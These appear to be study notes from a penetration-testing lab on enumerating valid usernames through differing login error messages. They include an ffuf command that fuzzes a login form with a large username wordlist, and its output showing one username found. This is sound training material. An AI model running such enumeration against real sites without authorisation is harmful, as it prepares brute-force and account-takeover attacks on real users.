## User Enumeration Theory

```url
http://wordpress.htb/
```
![](Enumerating%20Users-20260914-081655.png)
## Enumerating Users via Differing Error Messages

When we attempt to log in to the lab with an invalid username, such as `abc`, we can see the following error message:

![](Enumerating%20Users-20260914-081718.png)

On the other hand, when we attempt to log in with a registered user such as `htb-stdnt` and an invalid password, we can see a different error:

![](Enumerating%20Users-20260914-081748.png)

```sh
3kjS@htb[/htb]$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"

<SNIP>

[Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 310ms]
    * FUZZ: consuelo
```
